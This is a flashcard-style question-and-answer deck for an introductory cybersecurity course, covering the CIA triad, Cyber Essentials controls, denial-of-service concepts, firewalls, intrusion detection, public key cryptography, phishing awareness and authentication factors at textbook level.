Topic	Question	Answer
Security Basics	Name and define CIA:	1. Confidentiality: Ensures that computer related assets are accessed only by authorized parties. \n2. Integrity: Assets can be modified only by authorized parties or only in authorized ways. \n3. Availability: Assets are accessible to authorized parties at appropiate times.
Security Basics	Name the tools that enforce CIA:	1. Confidentiality: Encryption, Access control, Authentication, Authorization, Physical security. \n2. Integrity: Backups, Checksums, Data correcting codes. \n3. Availability: Physical protections, Computational redundancies.
Security Basics	Briefly describe all 5 of the security properties:	1. Confidentiality: No improper information gathering. \n2. Integrity: Data has not been (maliciously) altered. \n3. Availability: Data/services can be accessed as desired. \n4. Accountability: Actions are traceable to those responsible. \n5. Authentication: User or data origin are accurately identifiable
Security Basics	Name the 10 Steps to Cyber Security:	1. Defining and communicating Risk Management Regime. \n2. Network Security. \n3. Malware Protection. \n4. Monitoring. \n5. Incident Management. \n6. Managing User Priviledges. \n7. Removable Media Controls. \n8. Secure Configuration. \n9. Home and Mobile Working. \n10. User Education and Awareness.
Cyber Essentials	Name the 5 Cyber Security Essentials:	1. Secure configuration. \n2. Boundary firewalls and internet gateways. \n3. Access control and administrative privilege management. \n4. Patch management. \n5. Malware protection.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#1 Secure Configuration:	Want to reduce the level of inherent vulnerabilities in computers and network devices, and have them provide only the services required to fulfil their role. Mainly because default settings are not necessarily secure and predefined passwords tend to be widely known.
Cyber Essentials	State the 5 steps to achieve CSE#1 Secure Configuration:	1. Remove or disable unnecessary user accounts. \n2. Remove or disable unnecessary software. \n3. Remove or disable the auto-run feature. \n4. Change default passwords for user accounts to a strong password. \n5. Enable a personal firewall (or equivalent) on desktop PCs and laptops, and configure it to disable (block) unapproved connections by default.
Cyber Essentials	What constitutes a strong password?	Typically one that has a minimum number of characters in length (e.g. eight characters); differs from the associated username; contains no more than two identical characters in a row; is not a dictionary word; includes a mixture of numeric and alpha characters; has not been reused within a predetermined period of time (e.g. six months); and has not been used for another account.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#2 Boundary firewalls and internet gateways:	Want to protect information, applications and computers within the organization's internal networks against unauthorized access and disclosure from the internet, using boundary firewalls, internet gateways or equivalent network devices. \nBoundary devices are the first line of defense; firewall rules can be used to stop basic attacks before they even reach the internal network.
Cyber Essentials	State the 4 steps to achieve CSE#2 Boundary firewalls and internet gateways:	1. Change default administrator passwords for all network devices and firewalls. \n2. Have each rule that allows network traffic to pass through the firewall be approved by an authorized individual and documented. \n3. Disable (block) unapproved services, or services that are typically vulnerable to attack by default using boundary firewalls. \n4. Remove or disable in a timely manner firewall rules that are no longer required.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#3 Access control and administrative privilege management:	Want to manage effectively and provide the minimum level of access to applications, computers and networks by assigning user accounts, particularly those with special access privileges to authorized individuals.
Cyber Essentials	What is the principle of least priviledge?	Only give users access they need; admin accounts have the most access, if one gets compromised it can lead to large scale loss of information.
Cyber Essentials	State the 7 steps to achieve CSE#3 Access control and administrative privilege management:	1. Subject all user account creation to a provisioning and approval process. \n2. Restrict special access privileges to a limited number of authorized individuals. \n3. Document details about special access privileges, keep them in a secure location and review them on a regular basis. \n4. Use admin accounts only to perform legitimate admin activities, and do not grant them access to email or the internet. \n5. Configure admin accounts to require a password change on a regular basis. \n6. Have each user be authenticated using a unique username and strong password before being granted access to applications, computers and network devices. \n7. Remove or disable user accounts and special access privileges when no longer required or after a pre-defined period of inactivity.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#4 Patch management:	Want to keep software running on computers and network devices up-to-date and have the latest security patches installed. \nVulnerabilities in software are patched through updates; if you don't install the update, the vulnerability is not patched; patching can cause compatibility problems, thus you should always test the patches.
Cyber Essentials	State the 4 steps to achieve CSE#4 Patch management:	1. License and support software running on computers and network devices on the internet to ensure security patches for known vulnerabilities are made available. \n2. Install updates to software running on computers and network devices in a timely manner. \n3. Remove out-of-date software. \n4. Install all security patches for software in a timely manner.
Cyber Essentials	Describe the objectives and reasons to achieve CSE#5 Malware protection:	Want to protect computers exposed to the internet against malware infection through the use of malware protection software. \nTodays firewalls are very good, most malicious software must be invited in by a user opening an email, browsing a compromised website, or connecting compromised media; protection software continuously monitors the computer for known malicious programs.
Cyber Essentials	State the 5 steps to achieve CSE#5 Malware protection:	1. Install anti-malware software on all computers that are connected to or capable of connecting to the internet. \n2. Update anti-malware software on all computers. \n3. Configure anti-malware software to scan files automatically upon access and scan web pages when being accessed. \n4. Regularly scan all files. \n5. Ensure anti-malware software prevents connections to malicious websites on the internet.
Cyber Essentials	How can an institution/person receive the Cyber Essentials Certification?	Through first a self-assessment questionnaire, followed by an external vulnerability scan by an approved tester. The scan comprises of: \n1. External full TCP port and UDP service scan for stated IP range. \n2. Vulnerability scan for stated IP range. \n3. Basic web app scanning for common vulnerabilities.
Cyber Essentials	How can an institution/person receive the Cyber Essentials Certification Plus?	Once the Cyber Essentials Certification has been granted, an internal vulnerability scan and on-site assessment can be carried out by an approved tester. The scan comprises: \n1. Inbound email binaries and payloads. \n2. Inbound emails containing URLs linking to binaries and browser exploitation payloads. \n3. Authenticated vulnerability and patch verification scan.
Network and Internet vulnerabilities	Write down the structure of a URL, and give an example:	Figure 1
Network and Internet vulnerabilities	Describe briefly how routing works:	Your computer connects to the cloud, and the cloud to a webserver. In the cloud, there are multiple points prior to reaching the final path, such as multiple internet service providers, your modem, etc.
Network and Internet vulnerabilities	How do IP addresses work?	Every computer on a network has an IP address which is unique from the other computers. Each interface on a computer gets one IP address (WiFi gets one IP, wired gets another if both are connected). IP address changes every time the computer changes networks (Inside the University only the last few bits will normally change, but if you go home the whole address may change.)
Network and Internet vulnerabilities	How are IP addresses represented?	Figure 2
Network and Internet vulnerabilities	Explain what an autonomous system is and give a real example of one:	An Autonomous System is a single organisation which is in charge of routing for a set of IP addresses. The organisation in charge of rerouting of the network paths when Syria turned off the internet is an AS.
Network and Internet vulnerabilities	Explain what a Domain Name System (DNS) is and how they work:	DNS services translate URLs to their IP addresses (http://lemac.com -> 69.163.145.230). Mappings between URLs and IPs are not static and DNS service keep track of those. One domain, such as google.com, may have multiple IP addresses associated, as several computers are used for hosting that domain. DNS servers are best targets for attackers, since if the mappings are taken down the asociated websites go offline.
Network and Internet vulnerabilities	What can a Man in the Middle do, and who tend to be MMs?	Man in the Middle entities can view, change, add and delete traffic. They could be an ISP, VPN provider, Wifi provider, an attacker re-routing the connection, or an incompetent admin.
Network and Internet vulnerabilities	What are the types of Network Security Threats, and what security properties do they affect?	1. Interception: Unauthorized viewing of information. Affects Confidentiality. \n2. Modification: Unauthorized changing of information. Affects Integrity. \n3. Fabrication: Unauthorized creation of information. Affects Integrity. \n4. Interruption: Preventing authorized access. Affects Availability.
Network Protections	Which properties does Encryption guarantee and which doesn't it?	Applied to data, it guarantees confidentiality and integrity of the data, but not availability. Authentication and accountability are sometimes guaranteed and sometimes not, depending on how encryption is setup
Network Protections	Describe what a VPN is:	Some resources can only be accessed when your computer is connected to the interior of a private network, VPN makes it so your computer can be at home, but behave like it was directly connected to University network. Your computer sends some data, the VPN client on your computer wraps it in some encryption and sends the bigger message to the vpn host, the host decrypts it and drops it on the network just like it originated there.
Network Protections	What properties do VPNs provide?	Authentication and some Accountability, since all connections to the VPN server are authenticated, random people cannot connect. Confidentiality and Integrity between client and VPN host, since VPN connections are encrypted, so it doesn’t matter where the client is, their data will be safe in transit. \nAvailability is not guaranteed; and they are actually intentional Man-in-the-Middle attacks, a VPN server can read and alter any non-encrypted traffic flowing over it.
Network Protections	What is a Denial of Service (DoS) attack and which ones are the most common?	Attacks that prevent valid users from accessing a service. It can be commonly done by cutting power, cables; overloading a server with invalid traffic or removing a user account. However, more technical attacks include SYN flooding, Spoofing and Smurfing.
Network Protections	Explain how SYN Flooding works:	In a nutshell: send tons of requests at the victim and overload them. Alice sends many SYN packets, without acknowledging any replies. Bob accumulates more SYN packets than he can handle. More in Figure 3.
Network Protections	What are the problems and limitations of SYN flooding?	Attribution: attacker​ uses own ​ IP​ which ​ could be traced; and Bandwidth: attacker​ users own bandwidth​ which is likely ​smaller than a servers. \nIt is effective against a small target, such as someone running a game server in their home; and ineffective against a large target, such as a company website.
Network Protections	Describe Spoofing, and state its advantages and problems:	Same as SYN flooding, but forge the source of TCP packet. \nIts advantages are: harder to trace, and ACKs are sent to a second computer, less atacker bandwidth used. Its problem is that Ingress filtering is commonly used to drop packets with source addresses outside their origin network fragment. (ingress filtering is a technique ensuring incoming packets are actually from the networks from which they claim to originate).
Network Protections	Explain how Smurfing works:	Smurfing attack exploits the ICMP (Internet Control Message Protocol) whereby remote hosts respond to echo packets to say they are alive (ping). Some implementations respond to pings to broadcast addresses. \nThe idea is to Ping a LAN to find hosts, which then all respond to the ping. The attack consists in making a packet with a forged source address, containing the victim’s IP number. Send it to a smurf amplifier, who swamp the target with replies. Lans that allow Smurf attacks are badly configured, in which case one of the of the options is to blacklist these LANs.
Network Protections	Describe the Distributed Denial of Service (DDoS) attack and give some examples:	A DDoS attack occurs when a large number of machines work together to perform an attack that prevents valid users from service access. It raises the Slashdot effect, when a large number of valid users all try and access at once. Examples include botnets, or AWS.
Network Defenses	Draw the Open System Interconnect (OSI) model's graph, including the data/layers and header information.	Figure 4.
Network Defenses	What are Firewalls?	They are a set of rules allowing or denying traffic with the purpose of dividing the untrusted outside of a network from the more trusted interior of a network. Additionally, they can act as routers deciding where to send traffic.
Network Defenses	What differs between the types of Firewalls?:	At the implementation level: in software it's slower and easier to deploy on personal computers; and in hardware it's faster, somewhat safer but harder to add in. \nAt the number of OSI levels of processing required: Packet size (lvl1); MAC (lvl2) and IP (lvl3) filtering; Port filtering (lvl3); and Deep packet (lvl4+)
Network Defenses	How does a packet filtering gateway (or screening router) work?	It compares information found in the headers to policy rules, operating at OSI level 3. Source addresses and ports can be forged, which a packet filter cannot detect. Design is simple, but tons of rules are needed, so it is challenging to maintain.
Network Defenses	How does Stateful inspection firewall work? Give an example	Maintains state from one packet to another. Similar to a packet filtering gateway, but can remember recent events. \nExample - If outside host starts sending packets to many internal destination ports (aka port scan), a stateful firewall would record the number of ports probed and once it is over the threshold specified in the policy it would block all further traffic.
Network Defenses	How does an application proxy work? Give an example	Simulates the (proper) effects of an application at OSI level 7. Effectively a protective Man In The Middle that screens information at an application layer (OSI 7). Allows an administrator to block certain application requests. \nExample: \nBlock all web traffic containing certain words; \nRemove all macros from Microsoft Word files in email; \nPrevent anything that looks like a credit card number from leaving a database
Network Defenses	How do Personal firewalls work?	Runs on the workstation that it protects (software). Provides basic protection, especially for home or mobile devices. Malicious software can disable part or all of the firewall. Any rootkit type software can disable the firewall.
Network Defenses	What is the address space exhaustion in IPv4, and how does Network Address Translation (NAT) overcome it?	Less than 4.3 billion IPv4 addresses available, not enough addresses for every device on the planet. NAT solves it by having internal IP different than external IP; border router maps between its own IP and the internal ones. Additionally a single device can have multiple IPs as well, if there are multiple internet interfaces.
Network Defenses	Why do we need Intrusion detection systems (IDS)?	Because a user may let something into the network that is malicious, by being an insider threat themselves. These incidents cannot be prevented or anticipated in advance so the logical next step is to identify something bad is happening quickly, so you can address it.
Network Defenses	How do Signature based IDS work?	Perform simple pattern matching and report; Requires that admin anticipate attack; Attacker may test attack on common System; Impossible to detect a new type of attack; High accuracy, low false positives;
Network Defenses	How do Heuristic based IDS work?	Dynamically build a model of acceptable or normal behavior and flag anything that does situations that match the pattern not match; Does not need to anticipate potential patterns in advance attacks; Needs time to warm up to new signatures behavior; Can detect new types of attacks; Higher false positives, lower accuracy
Network Defenses	What is the problem with having a large number of alarms?	Too many alarms going off make it hard to investigate all of them in great depth; Some cyberattack insurance policies state that if you know about an attack and do nothing they will not cover the attack. Having a noisy IDS can potentially be a liability
Network Defenses	What are the two main encryption properties we want?	1. The ​ communication​ between you and the other party is ​confidential​ and has not been changed (Confidentiality & Integrity - cryptography is able to ensure these requirements are met). This way no one can read what you sent; No one can change what you sent. \n2. Knowing who​ you are communicating with (Difficult - cryptography is able to verify that you are speaking with same person, but not the identity). Verifying you are talking to who you think you are talking to and not someone else
Public key Cryptography	What is the idea behind public key cryptography?	Generate two keys that are paired, whatever one key locks only the other key can unlock. Public keys are given out to everybody, private keys are kept private.
Public key Cryptography	How does Alice send Bob a message only he can read, and prove it was her who sent it?	To send Bob a message only he can read, Alice encrypts the message with Bob's public key, since only Bob has his private key only he can decrypt the message. \nTo prove the message was hers, she can encrypt the message with her private key, then if Bob successfully decrypts the message with her public key, he will have verified it was Alice who sent the message.
Public key Cryptography	What are the three main ideas to keep track of which key goes with which person, and what are the limitations with the first two?	1. Have humans doing the linking of identity to cryptogtraphic keys. Problem is the chicken and egg problem for finding a guaranteed place to be from us without using cryptography. \n2. Develop a Web of trust by having everyone do a few verifications. Problem is that verifying long keys is hard and human error is high, thus creating a lack of trust. \n3. Having a couple of trusted groups that do the verifications. They would have high standards and everyone would trust them.
Public key Cryptography	How could humans do the linking of cryptographic keys to identities?	Posting public key somewhere public and verify it came from us (Such as Adobe Product Security Incident Response Team (PSIRT)) where other people can compare keys on their computers to a highly visible copy.
Public key Cryptography	How would the Web of trust work?	Alice hand verifies that Bobs public key really does belong to Bob (super long key). Alice signs the key by encrypting it with her private key. Anyone who has hand verified Alices key, can also trust Bobs key (if they trust Alice to do verifications)
Public key Cryptography	What are Certificate Authorities?	Certificate authorities verify the properties of a person/organization and issues a certificate signed by their private key. Certificates can be quite detailed about what has been verified and what they have been verified to do.
Public key Cryptography	Where are Certificate Authorities used?	Certificate Authorities are used by browsers to verify identity. Some sites are using untrusted certificate authorities (Uni creating own CA, using it to sign sites keys, as it costs money to get signed certificate). Operating system and browsers maintain lists of trusted CA, which vary by OSs, browsers, organisations
Usable Security and User Training	What are first and third party websites?	First are the ones you intentionally visit, third are the ones which the first party instructs to gather additional content from (ads, images, calendars, Facebook, etc).
Usable Security and User Training	How much do people account for security incidents, and why don't they use security or privacy technologies?	They account for 90%. They don't because: \n1. They don’t care about security and privacy. \n2. They don’t know about security and privacy issues. \n3. They cannot use security and privacy technologies
Usable Security and User Training	What are the 7 things to do to be safe online?	1. Install anti-virus scanner. \n2. Keep software updated. \n3. Select strong passwords. \n4. Use password manager. \n5. Use ad blocker. \n6. Remove unused software. \n7. When unsure about a website, Google for it
Usable Security and User Training	Lay out a possible cognitive walkthrough testing usability. Why do we need it?:	1. Will users try to achieve the outcome of our action? \n2. Will users see the trigger for the action? \n3. Once the trigger is found, will users recognise that an action will produce wanted effect? \n4. After the action, will the users understand the feedback? \nSecurity experts are not trained for usability, and Usability experts leave out important security steps (like key verification)
Usable Security and User Training	How do passwords work? Explain why they are so convenient, and what are the main problems with them:	A character string (password) is agreed upon between the user and the system, user proves their identity by providing the password. \n They are convenient because they are easy to store; encrypted; easy to enter on many systems; no special equipment needed; and it scales well. \n The main problem is that people choose easy to guess passwords. Passwords with low entropy are easy to guess, and those with high entropy are hard to remember.
Usable Security and User Training	What is the UK guidance on simplifying passwords?	1. Change all default passwords. \n2. Help users cope with password overload. \n3. Understand the limitations of user-generated passwords. \n4. Understand the limitations of machine generated passwords. \n5. Prioritize administrator and remote user accounts. \n6. Use account lockout and protective monitoring. \n7. Don’t store passwords as plain text.
Usable Security and User Training	Why are user-generated passwords less secure than machine-generated passwords?	User-generated passwords tend to be low entropy; have facts about themselves such as their pet’s name; are guessable by someone who knows them; and are easy to lookup in a password dictionary. \nMachine-generated passwords, on the other hand, select passwords that are challenging for other computers to guess, often produce passwords that are pronounceable or made up of words, and lets users choose from various options.
Usable Security and User Training	Explain the concept of phishing and give some examples:	Phishing is attempting to trick someone into taking the “bait” and interacting in a way they should not. It typically involves the impersonator pretending to be someone else that the person trusts. Examples include: clicking a link, opening a file, replying with information, transferring money, etc.
Usable Security and User Training	What are the different types of phishing?	The different types are: \n1. Spear phishing: phishing, but with a small number of targets and each email is crafted for that individual. \n2. Whaling: phishing for people with a lot of money, i.e. CEO. \n3. QRishing: phishing attacks through QR codes
Usable Security and User Training	How can you prevent phishing email interaction?	Scan all incoming attachments and links for blacklisted content and teach users to: only click if you are expecting the email; do not open attachments unless you are expecting them; if you are not sure, contact the person or company separately and ask if they sent the email; if you are not sure, contact the IT department; banks and credit card companies will never contact you this way.
Usable Security and User Training	Why do people click through warnings?	The site is used often and trusted; the person who posted the link is trusted; the site where the link is assumed to have good security; they think they are safe
Usable Security and User Training	What are the concepts of NEAT and SPRUCE?	They are guidance as to how to create effective security messaging for end users. Created by Microsoft Research.
Usable Security and User Training	Explain the concept of NEAT:	N​ecessary: Can you change the architecture to eliminate or defer this user decision? \nE​xplained: Does your user experience present all the information the user needs to make this decision? (See SPRUCE) \nActionable: Have you determined a set of steps the user will realistically be able to take to make the correct decision? \nT​ested: Have you checked that your user experience is NEAT for all scenarios, both benign and malicious? Have you tested it on a human who is not a member of your team?
Usable Security and User Training	Explain the concept of SPRUCE:	S​ource: State who or what is asking the user to make a decision. \nP​rocess: Give the user actionable steps to follow to make a good decision \nR​isk: Explain what bad thing could happen if the user makes the wrong decision \nU​nique knowledge the user has: Tell the user what information they bring to the decision \nC​hoices: List available options and clearly recommend one \nE​vidence: Highlight information the user should factor in or exclude in making a decision
Authentication	What is Authentication and when should it happen?	Verifying a fact about an entity before allowing it to perform an action. \nIt should happen every time an action is taken and there is no way to be certain that the authenticated entity has not changed. In practise, when logging into website, it looks like you authenticate once; however the computer is actually authenticating for you every time, talking to the server to prevent session hijacking.
Authentication	What 4 things are you authenticating?	The identity of a person; that they are same entity as who setup the account; that they have specific properties (E.g. above legal drinking age, student at uni, Facebook user); that another authenticator thinks they are same entity.
Authentication	What can authentication factors be?	1. Something you ​ know (can forget) ​ (pass, mothers maiden name, your address). \n2. Something you ​ have (can loose) ​ (student ID card, credit card chip, RSA key). \n3. Something you ​ are (can’t change) ​ (finger prints, voice tones, iris, typing patterns).
Authentication	Give examples of multi-factor authentication:	Two factor: \nChip & pin in credit card. Something you have (chip), Something you know (pin). \nChip & signature credit card. Something you have (chip), Something you are (signature pattern). \nThree factor: \nSecurity guard that checks your ID agains how you look and then requires a code. \nFinger print reading fob that gives a code after reading a print and then using code together with password to login
Authentication	Give an example of invisible continuing authentication:	Log into website using password (something you know); website sets a cookie with a secret and a timestamp; every time you visit a new page, your computer sends the cookie (something you have) and server verifies it; when you log out, the cookie is destroyed
